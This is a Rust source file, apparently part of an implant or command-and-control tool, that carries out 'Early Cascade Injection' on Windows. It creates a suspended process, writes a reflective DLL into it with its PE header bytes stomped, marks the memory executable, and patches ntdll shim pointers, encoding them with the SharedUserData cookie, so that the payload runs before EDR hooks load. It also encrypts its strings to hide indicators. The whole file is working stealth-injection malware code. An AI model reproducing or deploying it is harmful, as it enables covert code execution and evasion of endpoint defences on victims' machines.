use std::{ffi::c_void, ptr::null_mut};

use shared::tasks::WyrmResult;
use shared_no_std::{
    export_resolver::{ExportError, find_entrypoint_from_unmapped_image},
    memory::{EarlyCascadePointers, locate_shim_pointers},
};
use str_crypter::{decrypt_string, sc};
use windows_sys::Win32::{
    Foundation::{CloseHandle, FALSE, GetLastError, HANDLE},
    System::{
        Diagnostics::Debug::WriteProcessMemory,
        Memory::{
            MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PAGE_READWRITE, VirtualAllocEx,
            VirtualProtectEx,
        },
        Threading::{
            CREATE_SUSPENDED, CreateProcessA, GetProcessId, PROCESS_INFORMATION, ResumeThread,
            STARTUPINFOA,
        },
    },
};

use crate::{
    dbgprint,
    utils::{console::print_failed, pe_stomp::stomp_pe_header_bytes},
};

pub(super) fn early_cascade_spawn_child(mut buf: Vec<u8>, spawn_as: &str) -> WyrmResult<String> {
    //
    // Create the process in a suspended state, using the image specified by either the user (TODO) or
    // svchost as the default image.
    //
    let mut pi = PROCESS_INFORMATION::default();
    let mut si = STARTUPINFOA::default();
    si.cb = size_of::<STARTUPINFOA>() as u32;

    let spawn_as = if !spawn_as.ends_with('\0') {
        let mut s = spawn_as.to_string();
        s.push('\0');
        s
    } else {
        spawn_as.to_string()
    };

    let result_create_process = unsafe {
        CreateProcessA(
            null_mut(),
            spawn_as.as_ptr() as _,
            null_mut(),
            null_mut(),
            FALSE,
            CREATE_SUSPENDED,
            null_mut(),
            null_mut(),
            &si as *const STARTUPINFOA,
            &mut pi as *mut PROCESS_INFORMATION,
        )
    };

    // Check if we were successful..
    if result_create_process == 0 {
        let msg = format!(
            "{} {:#X}",
            sc!("Failed to create process. Error code:", 71).unwrap(),
            unsafe { GetLastError() }
        );

        #[cfg(debug_assertions)]
        {
            use crate::utils::console::print_failed;

            print_failed(&msg);
        }

        return WyrmResult::Err::<String>(msg);
    }

    //
    // Allocate the memory + copy our process image in (stomping some indicators in the process of)
    //

    let p_alloc = match write_image_rw(pi.hProcess, &mut buf) {
        Ok(p) => p,
        Err(e) => {
            let msg = format!(
                "{} {e:#X}",
                sc!("Failed to write process memory:", 71).unwrap()
            );

            dbgprint!("{}", msg);

            unsafe { CloseHandle(pi.hThread) };
            unsafe { CloseHandle(pi.hProcess) };

            return WyrmResult::Err::<String>(msg);
        }
    };

    //
    // Now the image is loaded in memory; we need to find the `Shim` export which is a small stub that sets the
    // stage for the rDLL stub to run in the newly created process.
    //

    let p_start = match find_entrypoint_from_unmapped_image(&buf, p_alloc as _, "Shim") {
        Ok(p) => p,
        Err(e) => {
            unsafe { CloseHandle(pi.hThread) };
            unsafe { CloseHandle(pi.hProcess) };

            let msg = match e {
                ExportError::ImageTooSmall => sc!("ImageTooSmall", 19).unwrap(),
                ExportError::ImageUnaligned => sc!("ImageUnaligned", 19).unwrap(),
                ExportError::ExportNotFound => sc!("ExportNotFound", 19).unwrap(),
                ExportError::BadImageDelta => sc!("BadImageDelta", 19).unwrap(),
            };

            #[cfg(debug_assertions)]
            {
                use crate::utils::console::print_failed;

                print_failed(&msg);
            }

            return WyrmResult::Err(msg);
        }
    };

    // rotr it for the ntdll pointer encryption compliance
    let p_start = encode_system_ptr(p_start);

    //
    // Mark memory RWX
    //

    let mut old_protect = 0;
    let _ = unsafe {
        VirtualProtectEx(
            pi.hProcess,
            p_alloc,
            buf.len(),
            PAGE_EXECUTE_READWRITE,
            &mut old_protect,
        )
    };

    let Ok(shim_addresses) = locate_shim_pointers() else {
        unsafe { CloseHandle(pi.hThread) };
        unsafe { CloseHandle(pi.hProcess) };
        let msg = sc!("Could not find shim addresses.", 179).unwrap();
        dbgprint!("{}", msg);
        return WyrmResult::Err(msg);
    };

    if let Err(e) = execute_early_cascade(shim_addresses, pi.hProcess, p_start) {
        unsafe { CloseHandle(pi.hThread) };
        unsafe { CloseHandle(pi.hProcess) };
        dbgprint!("{}", e);
        return WyrmResult::Err(e);
    }

    unsafe { ResumeThread(pi.hThread) };

    unsafe { CloseHandle(pi.hThread) };
    unsafe { CloseHandle(pi.hProcess) };

    let ok_msg = sc!("Process created via Early Cascade Injection.", 19).unwrap();
    dbgprint!("{}", ok_msg);
    WyrmResult::Ok(ok_msg)
}

/// Overwrites addresses in the target process which are required to enable the Early Cascade technique as documented:
/// https://www.outflank.nl/blog/2024/10/15/introducing-early-cascade-injection-from-windows-process-creation-to-stealthy-injection/
fn execute_early_cascade(
    ptrs: EarlyCascadePointers,
    h_proc: HANDLE,
    stub_addr: *const c_void,
) -> Result<(), String> {
    //
    // Patch g_pfnSE_DllLoaded to point to the `Shim` bootstrap stub in the rDLL
    //
    let mut bytes_written = 0;
    let buf = stub_addr as usize;

    let result = unsafe {
        WriteProcessMemory(
            h_proc,
            ptrs.p_g_pfnse_dll_loaded,
            &buf as *const _ as *const _,
            size_of::<usize>(),
            &mut bytes_written,
        )
    };

    if result == 0 {
        let gle = unsafe { GetLastError() };
        let msg = format!(
            "{} {gle:#X}",
            sc!("Failed to patch p_g_pfnse_dll_loaded. Win32 error:", 104).unwrap()
        );

        return Err(msg);
    }

    //
    // Patch g_ShimsEnabled to = 1 to enable the mechanism on process start
    //

    let mut bytes_written = 0;
    let buf = 1u8;

    let result = unsafe {
        WriteProcessMemory(
            h_proc,
            ptrs.p_g_shims_enabled as _,
            &buf as *const _ as *const _,
            1,
            &mut bytes_written,
        )
    };

    if result == 0 {
        let gle = unsafe { GetLastError() };
        let msg = format!(
            "{} {gle:#X}",
            sc!("Failed to patch p_g_shims_enabled. Win32 error:", 104).unwrap()
        );

        return Err(msg);
    }

    Ok(())
}

/// Allocates and writes memory pages in a remote process with `PAGE_READWRITE` protection
/// with the content of some user specified buffer.
///
/// # Returns
/// If successful will return the address of the allocation; if it fails, will return the error
/// produced from calling `GetLastError`
fn write_image_rw(h_process: HANDLE, buf: &mut Vec<u8>) -> Result<*const c_void, u32> {
    let pid = unsafe { GetProcessId(h_process) };
    if pid == 0 {
        let gle = unsafe { GetLastError() };
        return Err(gle);
    }

    let p_alloc = unsafe {
        VirtualAllocEx(
            h_process,
            null_mut(),
            buf.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        )
    };

    if p_alloc.is_null() {
        return Err(unsafe { GetLastError() });
    }

    //
    // Before copying the memory we will stomp some indicators that we are injecting a PE
    // such as the MZ and "This program.."
    //
    stomp_pe_header_bytes(buf);

    //
    // Now write the memory
    //

    let res =
        unsafe { WriteProcessMemory(h_process, p_alloc, buf.as_ptr() as _, buf.len(), null_mut()) };

    if res == 0 {
        print_failed(sc!("Failed to write process memory for command spawn.", 86).unwrap());
        return Err(unsafe { GetLastError() });
    }

    Ok(p_alloc)
}

// Thanks to   ->   https://github.com/0xNinjaCyclone/EarlyCascade/blob/main/main.c#L82
//             ->   https://malwaretech.com/2024/02/bypassing-edrs-with-edr-preload.html
fn encode_system_ptr(ptr: *const c_void) -> *const c_void {
    //
    // from the blog:
    // note: since many ntdll pointers are encrypted, we can’t just set the pointer to our
    // target address. We have to encrypt it first. Luckily, the key is the same value and
    // stored at the same location across all processes.
    //

    // get pointer cookie from SharedUserData!Cookie (0x330)
    let cookie = unsafe { *(0x7FFE0330 as *const u32) };

    // rotr64
    let ptr_val = ptr as usize;
    let xored = cookie as usize ^ ptr_val;
    let rotated = xored.rotate_right((cookie & 0x3F) as u32);

    rotated as *const c_void
}
